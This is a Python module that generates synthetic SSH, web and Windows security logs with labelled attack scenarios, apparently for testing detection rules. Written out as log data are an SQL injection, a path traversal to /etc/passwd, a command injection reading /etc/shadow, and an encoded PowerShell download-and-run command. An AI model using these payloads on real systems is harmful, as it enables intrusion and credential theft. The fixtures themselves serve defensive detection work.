"""Synthetic log generation engine with realistic background noise and injected attacks."""

import json
import random
from datetime import UTC, datetime, timedelta
from pathlib import Path

from sentinellog.simulate.scenarios import ScenarioRecord

BENIGN_USERS = ["devops", "sysadmin", "alice", "bob", "charlie", "deploy", "service_mgr"]
BENIGN_PATHS = [
    "/index.html",
    "/about.html",
    "/contact",
    "/products",
    "/pricing",
    "/api/v1/health",
    "/api/v1/status",
    "/static/css/bootstrap.min.css",
    "/static/js/bundle.js",
    "/static/images/logo.png",
    "/favicon.ico",
]
BENIGN_UAS = [
    (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0"
    ),
    (
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
        "AppleWebKit/605.1.15 (KHTML, like Gecko) Safari/16.5"
    ),
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
]


def _format_ssh_line(ts: datetime, host: str, proc: str, msg: str) -> str:
    """Format classic syslog SSH line."""
    ts_str = ts.strftime("%b %d %H:%M:%S")
    return f"{ts_str} {host} {proc}: {msg}"


def _format_web_line(
    ip: str, user: str, ts: datetime, method: str, url: str, status: int, size: int, ua: str
) -> str:
    """Format Apache/Nginx Combined access log line."""
    ts_str = ts.strftime("%d/%b/%Y:%H:%M:%S +0000")
    user_str = user if user else "-"
    size_str = str(size) if size >= 0 else "-"
    return f'{ip} - {user_str} [{ts_str}] "{method} {url} HTTP/1.1" {status} {size_str} "-" "{ua}"'


def simulate_logs(
    scenario: str,
    out_dir: Path | str,
    seed: int = 42,
    total_lines: int = 20000,
) -> list[ScenarioRecord]:
    """Generate synthetic benign background logs alongside designated threat scenarios."""
    rng = random.Random(seed)
    target = Path(out_dir)
    target.mkdir(parents=True, exist_ok=True)

    auth_lines: list[str] = []
    web_lines: list[str] = []
    windows_lines: list[str] = []
    scenario_records: list[ScenarioRecord] = []

    current_ts = datetime(2026, 10, 13, 8, 30, 0, tzinfo=UTC)
    host = "srv-prod-01"

    # Determine scenario flags
    run_brute = scenario in ("brute_force", "mixed")
    run_spray = scenario in ("spraying", "mixed")
    run_web = scenario in ("web_attack", "mixed")
    run_windows = scenario in ("windows_compromise", "mixed")

    # Generate background lines
    num_background = max(500, total_lines // 2) if scenario == "mixed" else 200

    for _ in range(num_background):
        current_ts += timedelta(seconds=rng.uniform(0.5, 3.0))

        # 1. SSH Benign Activity
        if (run_brute or run_spray or scenario == "mixed") and rng.random() < 0.4:
            user = rng.choice(BENIGN_USERS)
            internal_ip = f"10.0.0.{rng.randint(10, 50)}"
            port = rng.randint(30000, 60000)
            if rng.random() < 0.95:
                # Normal successful login
                msg = (
                    f"Accepted publickey for {user} from {internal_ip} "
                    f"port {port} ssh2: RSA SHA256:abc..."
                )
            else:
                # Rare accidental typo
                msg = f"Failed password for {user} from {internal_ip} port {port} ssh2"
            auth_lines.append(
                _format_ssh_line(current_ts, host, f"sshd[{rng.randint(1000, 9999)}]", msg)
            )

        # 2. Web Benign Activity
        if (run_web or scenario == "mixed") and rng.random() < 0.6:
            ip = (
                f"10.0.0.{rng.randint(10, 50)}"
                if rng.random() < 0.7
                else f"198.51.100.{rng.randint(100, 150)}"
            )
            user = rng.choice(BENIGN_USERS) if rng.random() < 0.3 else "-"
            method = "POST" if rng.random() < 0.1 else "GET"
            path = rng.choice(BENIGN_PATHS)
            status = 200 if rng.random() < 0.85 else (404 if rng.random() < 0.05 else 304)
            size = rng.randint(200, 15000) if status == 200 else 0
            ua = rng.choice(BENIGN_UAS)
            web_lines.append(_format_web_line(ip, user, current_ts, method, path, status, size, ua))

        # 3. Windows Benign Activity
        if run_windows and rng.random() < 0.5:
            user = rng.choice(BENIGN_USERS)
            normal_win_evt = {
                "TimeCreated": current_ts.strftime("%Y-%m-%dT%H:%M:%SZ"),
                "EventID": 4624,
                "Computer": "DC01",
                "TargetUserName": user,
                "IpAddress": f"10.0.0.{rng.randint(10, 50)}",
                "LogonType": 3,
            }
            windows_lines.append(json.dumps(normal_win_evt))

    # --- INJECT SCENARIO 1: SSH Brute Force ---
    if run_brute:
        brute_record = ScenarioRecord(
            scenario="brute_force",
            file="auth.log",
            expected_rules=["SSH-001"],
        )
        attacker_ip = "198.51.100.4"
        current_ts += timedelta(minutes=5)

        for _ in range(60):
            current_ts += timedelta(seconds=rng.uniform(0.5, 2.0))
            port = rng.randint(30000, 60000)
            pid = rng.randint(10000, 30000)
            msg = f"Failed password for admin from {attacker_ip} port {port} ssh2"
            auth_lines.append(_format_ssh_line(current_ts, host, f"sshd[{pid}]", msg))
            brute_record.line_numbers.append(len(auth_lines))

        # Follow with a success to simulate breach
        current_ts += timedelta(seconds=2)
        port = rng.randint(30000, 60000)
        pid = rng.randint(10000, 30000)
        succ_msg = f"Accepted password for admin from {attacker_ip} port {port} ssh2"
        auth_lines.append(_format_ssh_line(current_ts, host, f"sshd[{pid}]", succ_msg))
        brute_record.line_numbers.append(len(auth_lines))

        scenario_records.append(brute_record)

    # --- INJECT SCENARIO 2: Password Spraying ---
    if run_spray:
        spray_record = ScenarioRecord(
            scenario="spraying",
            file="auth.log",
            expected_rules=["SSH-002"],
        )
        spray_ip = "198.51.100.18"
        current_ts += timedelta(minutes=3)

        spray_users = [f"victim_user_{i}" for i in range(1, 16)]
        for victim in spray_users:
            current_ts += timedelta(seconds=rng.uniform(2.0, 5.0))
            port = rng.randint(30000, 60000)
            pid = rng.randint(10000, 30000)
            msg = f"Failed password for {victim} from {spray_ip} port {port} ssh2"
            auth_lines.append(_format_ssh_line(current_ts, host, f"sshd[{pid}]", msg))
            spray_record.line_numbers.append(len(auth_lines))

        scenario_records.append(spray_record)

    # --- INJECT SCENARIO 3: Web Application Attack ---
    if run_web:
        web_record = ScenarioRecord(
            scenario="web_attack",
            file="access.log",
            expected_rules=["WEB-001", "WEB-002", "WEB-003", "WEB-004", "WEB-006", "WEB-007"],
        )
        web_attacker = "203.0.113.88"
        current_ts += timedelta(minutes=2)

        ua_scanner = "sqlmap/1.7"
        # 1. Rapid 404 scanning (triggers WEB-004)
        for i in range(40):
            current_ts += timedelta(seconds=0.5)
            path = f"/random_probe_path_{i}.php"
            web_lines.append(
                _format_web_line(web_attacker, "-", current_ts, "GET", path, 404, 160, ua_scanner)
            )
            web_record.line_numbers.append(len(web_lines))

        # 2. Sensitive path probing (triggers WEB-006)
        current_ts += timedelta(seconds=1)
        web_lines.append(
            _format_web_line(web_attacker, "-", current_ts, "GET", "/.env", 404, 160, ua_scanner)
        )
        web_record.line_numbers.append(len(web_lines))

        # 3. SQL Injection (triggers WEB-001)
        current_ts += timedelta(seconds=1)
        sqli_url = "/search?q=%27%20OR%201%3D1--"
        web_lines.append(
            _format_web_line(web_attacker, "-", current_ts, "GET", sqli_url, 500, 890, ua_scanner)
        )
        web_record.line_numbers.append(len(web_lines))

        # 4. Path Traversal (triggers WEB-002)
        current_ts += timedelta(seconds=1)
        trav_url = "/view?doc=../../etc/passwd"
        web_lines.append(
            _format_web_line(web_attacker, "-", current_ts, "GET", trav_url, 200, 1200, ua_scanner)
        )
        web_record.line_numbers.append(len(web_lines))

        # 5. Command Injection (triggers WEB-007)
        current_ts += timedelta(seconds=1)
        cmdi_url = "/status?host=127.0.0.1;%20cat%20/etc/shadow"
        web_lines.append(
            _format_web_line(web_attacker, "-", current_ts, "GET", cmdi_url, 200, 450, ua_scanner)
        )
        web_record.line_numbers.append(len(web_lines))

        scenario_records.append(web_record)

    # --- INJECT SCENARIO 4: Windows Active Directory Compromise ---
    if run_windows:
        win_record = ScenarioRecord(
            scenario="windows_compromise",
            file="windows_security.jsonl",
            expected_rules=[
                "WIN-001",
                "WIN-002",
                "WIN-003",
                "WIN-004",
                "WIN-005",
                "WIN-006",
                "WIN-007",
            ],
        )
        win_attacker = "198.51.100.4"
        current_ts += timedelta(minutes=2)

        # 1. Logon failure burst (triggers WIN-001 and first step of WIN-007)
        for _ in range(12):
            current_ts += timedelta(seconds=rng.uniform(1.0, 3.0))
            fail_evt = {
                "TimeCreated": current_ts.strftime("%Y-%m-%dT%H:%M:%SZ"),
                "EventID": 4625,
                "Computer": "DC01",
                "TargetUserName": "administrator",
                "IpAddress": win_attacker,
                "LogonType": 3,
            }
            windows_lines.append(json.dumps(fail_evt))
            win_record.line_numbers.append(len(windows_lines))

        # 2. Successful logon from same IP (completes WIN-007 sequence)
        current_ts += timedelta(seconds=2)
        succ_evt = {
            "TimeCreated": current_ts.strftime("%Y-%m-%dT%H:%M:%SZ"),
            "EventID": 4624,
            "Computer": "DC01",
            "TargetUserName": "administrator",
            "IpAddress": win_attacker,
            "LogonType": 3,
        }
        windows_lines.append(json.dumps(succ_evt))
        win_record.line_numbers.append(len(windows_lines))

        # 3. External RDP Logon (triggers WIN-002)
        current_ts += timedelta(seconds=15)
        rdp_evt = {
            "TimeCreated": current_ts.strftime("%Y-%m-%dT%H:%M:%SZ"),
            "EventID": 4624,
            "Computer": "DC01",
            "TargetUserName": "administrator",
            "IpAddress": "203.0.113.50",
            "LogonType": 10,
        }
        windows_lines.append(json.dumps(rdp_evt))
        win_record.line_numbers.append(len(windows_lines))

        # 4. User account created (triggers WIN-003)
        current_ts += timedelta(seconds=30)
        user_evt = {
            "TimeCreated": current_ts.strftime("%Y-%m-%dT%H:%M:%SZ"),
            "EventID": 4720,
            "Computer": "DC01",
            "TargetUserName": "backdoor_admin",
            "SubjectUserName": "administrator",
        }
        windows_lines.append(json.dumps(user_evt))
        win_record.line_numbers.append(len(windows_lines))

        # 5. Added to local Administrators group (triggers WIN-004)
        current_ts += timedelta(seconds=10)
        group_evt = {
            "TimeCreated": current_ts.strftime("%Y-%m-%dT%H:%M:%SZ"),
            "EventID": 4732,
            "Computer": "DC01",
            "TargetUserName": "Administrators",
            "SubjectUserName": "backdoor_admin",
        }
        windows_lines.append(json.dumps(group_evt))
        win_record.line_numbers.append(len(windows_lines))

        # 6. Encoded PowerShell LOLBAS execution (triggers WIN-006)
        current_ts += timedelta(seconds=20)
        ps_evt = {
            "TimeCreated": current_ts.strftime("%Y-%m-%dT%H:%M:%SZ"),
            "EventID": 4688,
            "Computer": "DC01",
            "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": (
                "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAI"
                "ABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAG"
                "QAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AGkAbAAuAGMAbwB"
                "tAC8AcABheQBsAG8AYQBkAC4AcABzADEAJwApAA=="
            ),
        }
        windows_lines.append(json.dumps(ps_evt))
        win_record.line_numbers.append(len(windows_lines))

        # 7. Security audit log cleared (triggers WIN-005)
        current_ts += timedelta(seconds=15)
        clear_evt = {
            "TimeCreated": current_ts.strftime("%Y-%m-%dT%H:%M:%SZ"),
            "EventID": 1102,
            "Computer": "DC01",
            "SubjectUserName": "backdoor_admin",
        }
        windows_lines.append(json.dumps(clear_evt))
        win_record.line_numbers.append(len(windows_lines))

        scenario_records.append(win_record)

    # Write files
    if auth_lines:
        auth_file = target / "auth.log"
        auth_file.write_text("\n".join(auth_lines) + "\n", encoding="utf-8")
    if web_lines:
        web_file = target / "access.log"
        web_file.write_text("\n".join(web_lines) + "\n", encoding="utf-8")
    if windows_lines:
        windows_file = target / "windows_security.jsonl"
        windows_file.write_text("\n".join(windows_lines) + "\n", encoding="utf-8")

    labels_data = [rec.to_dict() for rec in scenario_records]
    labels_file = target / "labels.json"
    labels_file.write_text(json.dumps(labels_data, indent=2), encoding="utf-8")

    return scenario_records
